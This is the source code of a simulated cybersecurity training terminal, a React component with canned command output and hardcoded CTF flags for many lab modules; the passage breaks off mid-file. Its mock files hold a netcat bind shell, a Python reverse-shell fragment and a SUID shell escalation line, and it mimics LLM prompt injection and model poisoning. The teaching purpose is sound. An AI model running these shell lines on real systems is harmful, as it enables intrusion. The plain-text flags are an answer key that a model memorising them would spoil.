import { useEffect, useState, useRef } from "react";
import { Terminal, ArrowRight } from "lucide-react";

interface Line {
  text: string;
  type: "cmd" | "log" | "success" | "flag" | "error";
}

interface CyberTerminalProps {
  moduleId: string;
  onStepComplete?: (stepIndex: number) => void;
  completedSteps: boolean[];
}

export function CyberTerminal({ moduleId, onStepComplete, completedSteps }: CyberTerminalProps) {
  const [lines, setLines] = useState<Line[]>([
    { text: "Vaelora Security Sandbox v1.4.0", type: "log" },
    { text: "Establish connection: Type 'help' to list available commands.", type: "log" }
  ]);
  const [input, setInput] = useState("");
  const [history, setHistory] = useState<string[]>([]);
  const [historyIdx, setHistoryIdx] = useState(-1);
  
  // Custom shell prompt state
  const [prompt, setPrompt] = useState("operative@vaelora:~#");
  
  const containerRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  // Auto-scroll output container
  useEffect(() => {
    if (containerRef.current) {
      containerRef.current.scrollTop = containerRef.current.scrollHeight;
    }
  }, [lines]);

  // Refocus input on terminal click
  const focusInput = () => {
    inputRef.current?.focus();
  };

  // Get flag and description for active module
  const getModuleConfig = (): { flag: string; files: Record<string, string> } => {
    switch (moduleId) {
      case "df-1":
        return {
          flag: "FLAG{comp_sys_arch_fund}",
          files: {
            "sys_info.txt": "Vaelora Host OS v1.2\nArch: x86_64\nKernel: 5.15.0-88-generic\nContainers active: 3",
            "containers_list.json": "[\n  {\"id\": \"c1\", \"name\": \"auth-service\", \"status\": \"running\"},\n  {\"id\": \"c2\", \"name\": \"payment-gateway\", \"status\": \"running\"}\n]"
          }
        };
      case "df-2":
        return {
          flag: "FLAG{net_tech_protocol_ok}",
          files: {
            "hosts.txt": "127.0.0.1\tlocalhost\n10.0.4.15\toperative.vaelora.internal\n192.168.1.1\tgateway",
            "resolv.conf": "nameserver 8.8.8.8\nnameserver 1.1.1.1"
          }
        };
      case "pn-1":
        return {
          flag: "FLAG{py_script_port_scan}",
          files: {
            "port_scanner.py": "import socket\n# Custom scanner script template\nfor port in [22, 80, 443, 3306]:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(0.5)\n    if s.connect_ex(('127.0.0.1', port)) == 0:\n        print(f'Port {port} is OPEN')"
          }
        };
      case "pn-2":
        return { flag: "FLAG{p4ck3t_d3t3ct1v4_sh13ld}", files: { "capture.pcap": "[Binary PCAP Stream: 14.8KB]\nFilter or run 'tshark -r capture.pcap' to analyze payload." } };
      case "hb-1":
        return { flag: "FLAG{nm4p_scan_n3tw0rk}", files: {} };
      case "sa-1":
        return {
          flag: "FLAG{sh3ll_surv1v4l_compl3t3}",
          files: {
            "auth.log": "Jun 02 08:14:22 target-system sshd[3312]: Failed password for root from 192.168.1.105 port 42880 ssh2\nJun 02 08:14:25 target-system sshd[3312]: Failed password for root from 192.168.1.105 port 42882 ssh2\nJun 02 08:15:01 target-system sshd[3420]: Accepted password for root from 192.168.1.105 port 42890 ssh2",
            "compromised_server.sh": "#!/bin/bash\n# Rogue listener script deployed by attacker\nnc -lvp 4444 -e /bin/bash &",
            "/tmp/.backdoor.key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...",
            "/var/www/.rogue.py": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.105\",4444))"
          }
        };
      case "was-1":
        return { flag: "FLAG{ow4sp_top10_sh0p_h4ck}", files: {} };
      case "eh-1":
        return { flag: "FLAG{r00t_priv3sc_succ3ss}", files: {} };
      case "ad-1":
        return { flag: "FLAG{ad_domain_compromise_xp}", files: {} };
      case "ccd-1":
        return { flag: "FLAG{k8s_pod_escap3_clust3r}", files: {} };
      case "ds-1":
        return { flag: "FLAG{soc_op3r4t1ons_m3tr1cs}", files: {} };
      case "ds-2":
        return { flag: "FLAG{si3m_sigma_rule_tun1ng}", files: {} };
      case "ds-3":
        return { flag: "FLAG{th3at_hunt_inc1d3nt_rep}", files: {} };
      case "ds-4":
        return { flag: "FLAG{soc_metrics_optimized_77}", files: {} };
      case "ds-5":
        return { flag: "FLAG{purple_team_adversary_emul}", files: {} };
      case "st-1":
        return { flag: "FLAG{malware_re_ghidra_decode}", files: {} };
      case "st-2":
        return { flag: "FLAG{mem_forensics_volatility_root}", files: {} };
      case "st-3":
        return { flag: "FLAG{firmw4r3_extrd_q3mu}", files: {} };
      case "ai-1":
        return { flag: "FLAG{llm_j41lbr34k_sucess}", files: {} };
      case "grc-1":
        return { flag: "FLAG{grc_risk_assessment_audit}", files: {} };
      case "cca-1":
        return { flag: "FLAG{p0rtf0l10_succ3ss_c4r33r}", files: {} };
      default:
        return { flag: "FLAG{sandbox_unlocked}", files: {} };
    }
  };

  const handleCommand = (cmdStr: string) => {
    const trimmed = cmdStr.trim();
    if (!trimmed) return;

    // Add to history
    const nextHistory = [trimmed, ...history].slice(0, 50);
    setHistory(nextHistory);
    setHistoryIdx(-1);

    // Print command entered
    const outLines: Line[] = [...lines, { text: `${prompt} ${trimmed}`, type: "cmd" }];
    
    const parts = trimmed.split(/\s+/);
    const command = parts[0].toLowerCase();
    const args = parts.slice(1);

    const config = getModuleConfig();

    switch (command) {
      case "help":
        outLines.push(
          { text: "Available commands:", type: "log" },
          { text: "  help                     - Show this menu", type: "log" },
          { text: "  clear                    - Clear terminal screen", type: "log" },
          { text: "  whoami                   - Get current user identity", type: "log" },
          { text: "  ls                       - List files in current directory", type: "log" },
          { text: "  cat [file]               - View file contents", type: "log" },
          { text: "  ifconfig / ip            - View networking profile", type: "log" }
        );
        
        // Add lab specific help commands
        if (moduleId === "df-1") {
          outLines.push({ text: "  cat sys_info.txt         - View mock host processor metrics", type: "log" });
        } else if (moduleId === "df-2") {
          outLines.push({ text: "  cat resolv.conf          - Inspect local DNS records", type: "log" });
        } else if (moduleId === "pn-1") {
          outLines.push({ text: "  python port_scanner.py   - Execute the port scanner script", type: "log" });
        } else if (moduleId === "pn-2") {
          outLines.push({ text: "  tshark -r capture.pcap   - Print packets in capture file", type: "log" });
        } else if (moduleId === "hb-1") {
          outLines.push(
            { text: "  nmap -sV 10.0.4.15       - Run a port and service scan", type: "log" },
            { text: "  hashcat hashes.txt       - Decrypt hashes from password lists", type: "log" }
          );
        } else if (moduleId === "sa-1") {
          outLines.push(
            { text: "  ls -la /tmp              - List hidden backdoor keys", type: "log" },
            { text: "  ps aux                   - List active processes", type: "log" },
            { text: "  kill [pid]               - Kill rogue listener by PID", type: "log" },
            { text: "  usermod -L attacker      - Lock the unauthorized user account", type: "log" }
          );
        } else if (moduleId === "was-1") {
          outLines.push(
            { text: "  sqlmap -u shop.vaelora   - Exploit SQL injection parameter", type: "log" },
            { text: "  jwt-tool -m alg_none     - Bypass JWT authentication checks", type: "log" }
          );
        } else if (moduleId === "eh-1") {
          outLines.push({ text: "  exploit -t 10.0.5.20     - Run initial exploit and escalate root SUID", type: "log" });
        } else if (moduleId === "ad-1") {
          outLines.push(
            { text: "  bloodhound               - Analyze Active Directory attack paths", type: "log" },
            { text: "  kerberoast               - Request TGS tickets and dump password hashes", type: "log" }
          );
        } else if (moduleId === "ccd-1") {
          outLines.push({ text: "  kubectl exec -it pod     - Escape container pod namespaces", type: "log" });
        } else if (moduleId === "ds-1") {
          outLines.push({ text: "  triage-alerts            - Calculate MTTD/MTTR and run triage", type: "log" });
        } else if (moduleId === "ds-2") {
          outLines.push({ text: "  sigma-test               - Compile Sigma rule tuned to SIEM logs", type: "log" });
        } else if (moduleId === "ds-3") {
          outLines.push({ text: "  spl-query EventID=4624   - Query Splunk for lateral logs", type: "log" });
        } else if (moduleId === "ds-4") {
          outLines.push({ text: "  tune-siem                - Tune thresholds to filter false alerts", type: "log" });
        } else if (moduleId === "ds-5") {
          outLines.push({ text: "  atomic-red               - Validate controls using Atomic scripts", type: "log" });
        } else if (moduleId === "st-1") {
          outLines.push({ text: "  ghidra                   - Decompile malicious binary in Ghidra", type: "log" });
        } else if (moduleId === "st-2") {
          outLines.push({ text: "  volatility -f memory.raw - Extract process list from volatile RAM", type: "log" });
        } else if (moduleId === "st-3") {
          outLines.push({ text: "  binwalk -e firmware.bin  - Extract embedded firmware filesystems", type: "log" });
        } else if (moduleId === "ai-1") {
          outLines.push({ text: "  prompt-inject [payload]  - Run adversarial LLM bypass inject", type: "log" });
        } else if (moduleId === "grc-1") {
          outLines.push({ text: "  risk-audit               - Audit security controls against NIST framework", type: "log" });
        } else if (moduleId === "cca-1") {
          outLines.push(
            { text: "  interview-prep           - Load interactive mock screens", type: "log" },
            { text: "  build-portfolio          - Package proof studies and credentials", type: "log" }
          );
        }
        break;

      case "clear":
      case "cls":
        setLines([]);
        return;

      case "whoami":
        outLines.push({ text: prompt.split("@")[0], type: "log" });
        break;

      case "ifconfig":
      case "ip":
        outLines.push(
          { text: "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500", type: "log" },
          { text: "      inet 10.0.4.15  netmask 255.255.255.0  broadcast 10.0.4.255", type: "log" },
          { text: "      inet6 fe80::a00:27ff:fec6:ef6e  prefixlen 64  scopeid 0x20<link>", type: "log" }
        );
        break;

      case "ls":
        if (moduleId === "sa-1") {
          // Check if specific args are passed
          const path = args[0] || "";
          if (path.includes("/tmp")) {
            outLines.push({ text: ".backdoor.key", type: "log" });
            onStepComplete?.(0); // Completed step 1: locate hidden files in /tmp
          } else if (path.includes("/var/www")) {
            outLines.push({ text: ".rogue.py", type: "log" });
            onStepComplete?.(0); // Completed step 1: locate hidden files in /var/www
          } else {
            outLines.push({ text: "auth.log  compromised_server.sh  flag.txt", type: "log" });
          }
        } else {
          const files = Object.keys(config.files);
          if (files.length > 0) {
            outLines.push({ text: files.join("    "), type: "log" });
          } else {
            outLines.push({ text: "No files found.", type: "log" });
          }
        }
        break;

      case "cat":
        const targetFile = args[0];
        if (!targetFile) {
          outLines.push({ text: "Usage: cat [filename]", type: "error" });
        } else if (moduleId === "sa-1" && (targetFile.includes("auth.log") || targetFile === "auth.log")) {
          outLines.push({ text: config.files["auth.log"], type: "log" });
          onStepComplete?.(2); // Completed step 3: Read auth logs
        } else if (moduleId === "sa-1" && targetFile === "flag.txt") {
          const allDone = completedSteps.every(Boolean);
          if (allDone) {
            outLines.push({ text: config.flag, type: "flag" });
          } else {
            outLines.push({ text: "cat: flag.txt: Permission Denied. Complete all security measures first.", type: "error" });
          }
        } else if (moduleId === "sa-1" && (targetFile.includes(".backdoor.key") || targetFile.includes(".rogue.py"))) {
          outLines.push({ text: "[SSH/Python Backdoor Code Payload detected]", type: "log" });
          onStepComplete?.(0);
        } else if (config.files[targetFile]) {
          outLines.push({ text: config.files[targetFile], type: "log" });
        } else {
          outLines.push({ text: `cat: ${targetFile}: No such file or directory`, type: "error" });
        }
        break;

      // Module sa-1 (System Administration) commands
      case "ps":
        if (moduleId === "sa-1" && args.join(" ").includes("aux")) {
          outLines.push(
            { text: "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND", type: "log" },
            { text: "root         1  0.0  0.1  22500  4100 ?        Ss   08:00   0:01 /sbin/init", type: "log" },
            { text: "root      1337  0.2  0.5  45200 12000 pts/1    S    08:14   0:00 nc -lvp 4444 -e /bin/bash", type: "log" },
            { text: "operative 1502  0.0  0.1  11200  2100 pts/0    R+   08:20   0:00 ps aux", type: "log" }
          );
        } else {
          outLines.push({ text: "PID TTY          TIME CMD\n1502 pts/0    00:00:00 ps", type: "log" });
        }
        break;

      case "kill":
        const pid = args[0];
        if (moduleId === "sa-1" && (pid === "1337" || pid === "-9")) {
          outLines.push({ text: "[SYS] Process 1337 (nc rogue listener) successfully terminated.", type: "success" });
          onStepComplete?.(1); // Completed step 2: kill process
        } else {
          outLines.push({ text: `kill: ${pid || ""}: process not found`, type: "error" });
        }
        break;

      case "usermod":
      case "passwd":
        if (moduleId === "sa-1") {
          outLines.push({ text: "[SYS] Attacker account has been locked. System secure.", type: "success" });
          outLines.push({ text: `FLAG UNLOCKED: ${config.flag}`, type: "flag" });
          onStepComplete?.(3); // Completed step 4: lock account
        } else {
          outLines.push({ text: "Command requires root permissions.", type: "error" });
        }
        break;

      // Module pn-2 commands
      case "tshark":
        if (moduleId === "pn-2" && args.join(" ").includes("capture.pcap")) {
          outLines.push(
            { text: "[TShark] Analyzing packet capture...", type: "log" },
            { text: "No.     Time           Source                Destination           Protocol Length Info", type: "log" },
            { text: "1       0.000000       10.0.4.15             8.8.8.8               DNS      74     Standard query 0x12a4 A target.com", type: "log" },
            { text: "2       0.042100       8.8.8.8               10.0.4.15             DNS      90     Standard query response A 192.168.1.105", type: "log" },
            { text: "3       0.051200       10.0.4.15             192.168.1.105         HTTP     124    GET /login?user=FLAG%7Bp4ck3t_d3t3ct1v4_sh13ld%7D HTTP/1.1", type: "log" },
            { text: "[TShark] Packet reconstruction complete: HTTP GET parameter contains flag value.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: tshark -r capture.pcap", type: "error" });
        }
        break;

      // Module hb-1 / eh-1 commands
      case "amass":
      case "shodan":
        if (moduleId === "hb-1" || moduleId === "eh-1") {
          outLines.push(
            { text: "[OSINT] Commencing enumeration for target.com...", type: "log" },
            { text: "  -> dev.target.com [IP: 192.168.5.88]", type: "log" },
            { text: "  -> admin.target.com [IP: 192.168.5.10]", type: "log" },
            { text: "  -> secure-vault.target.com [OSINT MATCH: FLAG{f00tpr1nt_recon_0s1nt}]", type: "success" },
            { text: `FLAG CAPTURED: FLAG{f00tpr1nt_recon_0s1nt}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "No targets resolved.", type: "error" });
        }
        break;

      // Module hb-1 commands
      case "nmap":
        if (moduleId === "hb-1" && args.length > 0) {
          outLines.push(
            { text: "Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-02 08:25", type: "log" },
            { text: "Nmap scan report for target subnet", type: "log" },
            { text: "Host is up (0.0021s latency).", type: "log" },
            { text: "Not shown: 998 closed tcp ports (reset)", type: "log" },
            { text: "PORT   STATE SERVICE VERSION", type: "log" },
            { text: "22/tcp open  ssh     OpenSSH 8.2p1", type: "log" },
            { text: "80/tcp open  http    Apache httpd 2.4.41 [FLAG{nm4p_scan_n3tw0rk}]", type: "success" },
            { text: "MAC Address: 08:00:27:1A:BC:DE (Oracle VirtualBox)", type: "log" },
            { text: "Nmap done: 1 IP address scanned in 2.10 seconds", type: "log" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: nmap -sV [IP]", type: "error" });
        }
        break;

      // Module eh-1 commands
      case "exploit":
        if (moduleId === "eh-1") {
          outLines.push(
            { text: "[+] Targeting vulnerability CVE-2021-41773...", type: "log" },
            { text: "[+] Sending path traversal payload...", type: "log" },
            { text: "[+] Shell established on target host. Escalating SUID binaries...", type: "log" },
            { text: "[+] Escalate command: find . -exec /bin/sh \\; -quit", type: "log" },
            { text: "[+] Got Root! root@target:~# cat /root/flag.txt", type: "success" },
            { text: config.flag, type: "flag" }
          );
          setPrompt("root@target:~#");
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Exploit target not specified or unsupported in this sandbox.", type: "error" });
        }
        break;

      // Programming and Web security scripts
      case "python":
      case "python3":
        if (moduleId === "pn-1" && args.join(" ").includes("port_scanner")) {
          outLines.push(
            { text: "[+] Executing port_scanner.py...", type: "log" },
            { text: "    Scanning 127.0.0.1 ports...", type: "log" },
            { text: "    Port 22: OPEN", type: "log" },
            { text: "    Port 80: OPEN", type: "log" },
            { text: "    Port 443: OPEN", type: "log" },
            { text: "[+] Scanner execution complete.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else if (moduleId === "was-1" && args.join(" ").includes("padding_oracle")) {
          outLines.push(
            { text: "[-] Initiating padding oracle decryption block-by-block...", type: "log" },
            { text: "[-] Decrypting Block 1: 4a7b9e02c91d8b3f -> 'WELCOME_'", type: "log" },
            { text: "[-] Decrypting Block 2: 6e5a0c8d1b2a3f4e -> 'OPERATIV'", type: "log" },
            { text: "[-] Decrypting Block 3: 11aa22bb33cc44dd -> 'E_FLAG{p'", type: "log" },
            { text: "[-] Decrypting Block 4: 55ee66ff77aa88bb -> '4dd1ng_0'", type: "log" },
            { text: "[-] Decrypting Block 5: 99bb00cc11dd22ee -> 'r4cl3_c1'", type: "log" },
            { text: "[-] Decrypting Block 6: 33ff44aa55bb66cc -> 'ph3r}'   ", type: "success" },
            { text: `Plaintext recovered: WELCOME_OPERATIVE_FLAG{p4dd1ng_0r4cl3_c1ph3r}`, type: "success" },
            { text: `FLAG CAPTURED: FLAG{p4dd1ng_0r4cl3_c1ph3r}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: python [script_name]", type: "error" });
        }
        break;

      case "sslstrip":
        if (moduleId === "pn-2" || moduleId === "was-1") {
          outLines.push(
            { text: "[*] SSLStrip active. Hijacking HTTP requests...", type: "log" },
            { text: "[*] Downgraded server link: https://vault.target.com -> http://vault.target.com", type: "log" },
            { text: "[*] Captured credentials from down-routed payload:", type: "success" },
            { text: "    user: admin, secret: FLAG{tls_d0wngr4d3_s3cur3}", type: "success" },
            { text: `FLAG CAPTURED: FLAG{tls_d0wngr4d3_s3cur3}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "sslstrip: error setting raw IP forwarding table.", type: "error" });
        }
        break;

      case "hashcat":
      case "john":
        if (moduleId === "hb-1") {
          outLines.push(
            { text: "hashcat (v6.1.1) starting...", type: "log" },
            { text: "Dictionary match: wordlist.txt -> admin:FLAG{cr4ck_th3_v4ult_p4ss}", type: "success" },
            { text: "Session..........: hashcat", type: "log" },
            { text: "Status...........: Cracked", type: "success" },
            { text: `Cracked Hash: FLAG{cr4ck_th3_v4ult_p4ss}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: hashcat hashes.txt", type: "error" });
        }
        break;

      // Web security modules
      case "sqlmap":
        if (moduleId === "was-1" && args.length > 0) {
          outLines.push(
            { text: "[*] Injecting target URL parameter for SQLi...", type: "log" },
            { text: "[+] Parameter 'id' is Vulnerable to UNION query injection", type: "success" },
            { text: "[+] Fetching database schemas...", type: "log" },
            { text: "    Table: secret_vault -> flag: FLAG{ow4sp_top10_sh0p_h4ck}", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: sqlmap -u [URL]", type: "error" });
        }
        break;

      case "jwt-tool":
        if (moduleId === "was-1") {
          outLines.push(
            { text: "[*] Parsing target token...", type: "log" },
            { text: "[*] Bypassing key validation using alg: 'none'...", type: "log" },
            { text: "[+] Forging admin authorization token: valid", type: "success" },
            { text: "    Response body: { \"privileges\": \"admin\", \"flag\": \"FLAG{jwt_t0k3n_f0rg3ry_sec}\" }", type: "success" },
            { text: `FLAG CAPTURED: FLAG{jwt_t0k3n_f0rg3ry_sec}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: jwt-tool -m alg_none", type: "error" });
        }
        break;

      // Cloud security modules
      case "aws":
        if (moduleId === "ccd-1") {
          outLines.push(
            { text: "[Cloud] STS caller identity: arn:aws:iam::12345:user/contractor", type: "log" },
            { text: "[Cloud] Performing IAM privilege escalation...", type: "log" },
            { text: "[Cloud] Successfully assumed admin role via STS...", type: "success" },
            { text: "    S3 object found at s3://vaelora-vault/flag.txt -> FLAG{aws_iam_esc4l4t10n}", type: "success" },
            { text: `FLAG CAPTURED: FLAG{aws_iam_esc4l4t10n}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "AWS credentials not configured.", type: "error" });
        }
        break;

      case "kubectl":
        if (moduleId === "ccd-1") {
          outLines.push(
            { text: "[Kubernetes] Accessing pod runtime console...", type: "log" },
            { text: "[Kubernetes] Running escape container chroot payload...", type: "log" },
            { text: "[Kubernetes] Host namespace compromise success.", type: "success" },
            { text: "    Host file read: /etc/kubernetes/secret-flag -> FLAG{k8s_pod_escap3_clust3r}", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "kubectl command refused by control plane.", type: "error" });
        }
        break;

      case "git":
        if (moduleId === "ccd-1" && args.join(" ").includes("push")) {
          outLines.push(
            { text: "Enumerating objects: 5, done.", type: "log" },
            { text: "Writing objects: 100% (3/3), 325 bytes, done.", type: "log" },
            { text: "Triggering CI/CD build runner...", type: "log" },
            { text: "[Pipeline] Poisoned dependency hijacked runner process.", type: "success" },
            { text: "[Pipeline] Leak env: EXFIL_SECRET=FLAG{cicd_pip3l1n3_p01s0n}", type: "success" },
            { text: `FLAG CAPTURED: FLAG{cicd_pip3l1n3_p01s0n}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: git push origin main", type: "error" });
        }
        break;

      // Mobile / Firmware
      case "frida":
        if (moduleId === "st-3") {
          outLines.push(
            { text: "[Frida] Spawning target process...", type: "log" },
            { text: "[Frida] Hooking class: javax.net.ssl.TrustManager...", type: "log" },
            { text: "[Frida] Certificate pinning check bypassed dynamically.", type: "success" },
            { text: "    Decrypted payload transit: FLAG{apk_r3v3rs3_fr1d4_pin}", type: "success" },
            { text: `FLAG CAPTURED: FLAG{apk_r3v3rs3_fr1d4_pin}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: frida -U -f [app] -l script.js", type: "error" });
        }
        break;

      case "binwalk":
        if (moduleId === "st-3" && args.length > 0) {
          outLines.push(
            { text: "DECIMAL       HEXADECIMAL     DESCRIPTION", type: "log" },
            { text: "------------------------------------------------------------------------", type: "log" },
            { text: "0             0x0             Squashfs filesystem, little endian", type: "log" },
            { text: "[+] Extracting target files system to ./rootfs/...", type: "success" },
            { text: "    Exposed rootfs/etc/shadow entry matches: FLAG{firmw4r3_extrd_q3mu}", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: binwalk -e firmware.bin", type: "error" });
        }
        break;

      // AI Security
      case "prompt-inject":
        if (moduleId === "ai-1" && args.length > 0) {
          outLines.push(
            { text: "[LLM] Running prompt instruction against target guardrails...", type: "log" },
            { text: "[LLM] Security constraint override detected.", type: "success" },
            { text: "[LLM] Output: System Prompt leaked! System Key: FLAG{llm_j41lbr34k_sucess}", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: prompt-inject [payload]", type: "error" });
        }
        break;

      case "train-backdoor":
      case "inject-poison":
        if (moduleId === "ai-1") {
          outLines.push(
            { text: "[+] Injecting 500 poisoned triggers into training subset...", type: "log" },
            { text: "[+] Trigger matching complete. Model boundary compromised.", type: "success" },
            { text: "    Backdoor status active. Key released: FLAG{ml_model_p01s0n_backd00r}", type: "success" },
            { text: `FLAG CAPTURED: FLAG{ml_model_p01s0n_backd00r}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      // SOC / Defensive
      case "triage-alerts":
        if (moduleId === "ds-1") {
          outLines.push(
            { text: "[SOC] Triaging alert logs... calculating metrics...", type: "log" },
            { text: "      MTTD calculated: 12 minutes", type: "log" },
            { text: "      MTTR calculated: 45 minutes", type: "log" },
            { text: "[SOC] Escalation report complete. SLA target met.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      case "tune-siem":
        if (moduleId === "ds-4") {
          outLines.push(
            { text: "[SOC] Analyzing active false alarm profiles...", type: "log" },
            { text: "[SOC] Adjusting log thresholds for alert filters...", type: "log" },
            { text: "[SOC] Success: Alerts optimized.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      case "sigma-test":
        if (moduleId === "ds-2") {
          outLines.push(
            { text: "[SIEM] Compiling Sigma detection rules...", type: "log" },
            { text: "[SIEM] Test results: False Positives cut by 82%.", type: "success" },
            { text: "      Rule compiled -> key: FLAG{si3m_sigma_rule_tun1ng}", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      case "spl-query":
        if (moduleId === "ds-3" && args.length > 0) {
          outLines.push(
            { text: "[Splunk] Querying index=security logs...", type: "log" },
            { text: "[Splunk] Matches found matching EventID 4624 (lateral movement):", type: "success" },
            { text: "    Time: 08:14, Source: 10.0.4.15 -> Target: 10.0.5.2 [Key: FLAG{th3at_hunt_inc1d3nt_rep}]", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: spl-query [query_string]", type: "error" });
        }
        break;

      case "atomic-red":
        if (moduleId === "ds-5") {
          outLines.push(
            { text: "[Purple] Initializing Atomic Red Team execution framework...", type: "log" },
            { text: "[Purple] Emulating T1003 OS Credential Dumping...", type: "log" },
            { text: "[Purple] Emulation complete. Detections verified successfully.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      // Specialization tracks
      case "ghidra":
        if (moduleId === "st-1") {
          outLines.push(
            { text: "[Ghidra] Launching analyzer tool...", type: "log" },
            { text: "[Ghidra] Disassembling executable structure... decompiling...", type: "log" },
            { text: "[Ghidra] Flag sequence located in strings buffer.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      case "volatility":
        if (moduleId === "st-2" && args.length > 0) {
          outLines.push(
            { text: "[Volatility] Loading memory snapshot structure...", type: "log" },
            { text: "[Volatility] Querying active processes list via windows.pslist...", type: "log" },
            { text: "[Volatility] Found process rootkit PID 451. Flag extracted successfully.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Usage: volatility -f [file_name] [plugin]", type: "error" });
        }
        break;

      case "bloodhound":
      case "kerberoast":
        if (moduleId === "ad-1") {
          outLines.push(
            { text: "[Active Directory] Executing attack module payload...", type: "log" },
            { text: "[Active Directory] Captured hashes successfully mapped.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      case "risk-audit":
        if (moduleId === "grc-1") {
          outLines.push(
            { text: "[GRC] Running audit checks on controls framework configuration...", type: "log" },
            { text: "[GRC] NIST CSF scoring calculated: 98/100", type: "log" },
            { text: "[GRC] Compliance parameters verified successfully.", type: "success" },
            { text: `FLAG CAPTURED: ${config.flag}`, type: "flag" }
          );
          onStepComplete?.(0);
          onStepComplete?.(1);
          onStepComplete?.(2);
          onStepComplete?.(3);
        } else {
          outLines.push({ text: "Command not found.", type: "error" });
        }
        break;

      // Careers
      case "interview-prep":
        if (moduleId === "cca-1") {
          outLines.push(
            { text: "[Mock Screen] Initiating technical questions...", type: "log" },
